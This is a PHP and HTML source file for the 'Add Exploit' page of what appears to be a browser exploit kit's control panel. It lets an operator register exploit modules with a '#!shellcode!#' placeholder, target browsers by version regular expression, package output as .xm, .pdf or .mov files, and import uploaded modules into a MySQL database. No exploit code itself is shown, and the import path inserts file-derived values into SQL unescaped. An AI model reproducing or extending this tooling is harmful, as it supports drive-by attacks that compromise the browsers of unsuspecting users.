<h1>Add Exploit</h1><br>
<form method=POST>
<b>NOTE: Mark the Shellcode position with: <i>#!shellcode!#</i></b><br>
Exploit Name:	<input payload=text name=name size="60" maxlength="100"><br>
Payload Type:<input type=text name=payload maxlength="50"><br> <i>example: #!shellcode!# or #!file!# Note: dynamic shellcode NOT YET supported for binary exploits! Create an exploit for every OS!</i><br>
Target Browser:	<input type=text name=target maxlength="50"><br>
Target Version:	<font size=4>/^</font></b><input type=text name=version maxlength="50">&nbsp;<i>RegExp Supported! (/^1.0.[0-9]/)</i><br>
Code:	<br><textarea name=code cols=60 rows=10 ></textarea><br>
Active:	<select name=active><option value=true>active</option><option value=false>inactive</option></select><br>
Output File (*.xm):<input type=text name=file maxlength="30"><select name="ext"><option value=".xm">.xm</option><option value=".pdf">.pdf</option><option value=".mov">.mov</option></select><br>
<input type=submit name=create value=create><input type=submit name="create_bin" value="create binary"><br><br>
</form><form method=POST enctype="multipart/form-data">
<b>OR</b> import .xm-file:<br>
<input type=file name=xmfile>
<input type=submit name=import value=import>
</form>
<?php
include('include/xmwrite.php');
include('include/xmread.php');

$ext=array('.xm', '.mov', '.pdf');
if(isset($_POST['create']) OR $_POST['create_bin']) {
if(empty($_POST['name']) OR empty($_POST['payload']) OR empty($_POST['target']) OR empty($_POST['version']) OR empty($_POST['code']) OR empty($_POST['file']) OR empty($_POST['active'])) {
	$error="You have to fill all fields out!";
} elseif(strpos(urldecode($_POST['file']),"/")!==false) {
		$error="Illegal filename!";
} elseif($_POST['name']!=mysql_escape_string(htmlspecialchars($_POST['name']))) {
		$error="Illegal character in field 'name'!";
} elseif(!in_array($_POST['ext'], $ext)) {
	$error="Heh! Bad Filename :D";
} else {
if(!empty($_POST['create_bin'])) {
$xm= new xmwrite($_POST['name'], "#!binary!#", $_POST['target'], '/^'.$_POST['version'].'/', $_POST['code'], $_POST['file'].$_POST['ext'], $_POST['active']);
} else{
$xm= new xmwrite($_POST['name'], $_POST['payload'], $_POST['target'], '/^'.$_POST['version'].'/', $_POST['code'], $_POST['file'].$_POST['ext'], $_POST['active']);
}
if($xm==0) {
	$error="A file with this name already exists!";
} else {
$msg="Exploit added!";
}
}
} elseif(isset($_POST['import'])) {
	include('include/mysql_connect.php');
	
	$filename = $_FILES["xmfile"]["name"];
	$fileext = explode(".", $filename);

	if($_FILES['xmfile']['error'] == 4) {
		$error = "You didn't select a file!";
	} elseif($fileext[count($fileext)-1]!="xm") {
		$error="No Exploit-Module (.xm)!";
	} elseif(!file_exists('xmodules/'.$filename)) {
	move_uploaded_file($_FILES['xmfile']['tmp_name'], 'xmodules/'.$_FILES['xmfile']['name']);
	
	$xm = new xmread('xmodules/'.$filename); // read xmodule...
	
	if(!ModuleExists($filename)) {
		$mysql_tablename=$mysql_prefix."xmodules";
		$sql = "INSERT INTO ".$mysql_tablename." ( `name`, `payload`, `browser`, `version`, `filename`, `active`) VALUES ('$xm->name', '$xm->payload', '$xm->browser', '$xm->version', '$filename', 'true');";
		mysql_query($sql) OR die(mysql_error());
		$msg="Exploit imported!";
	}
	} else {
		$error="A file with this name already exists!";	
	}
}
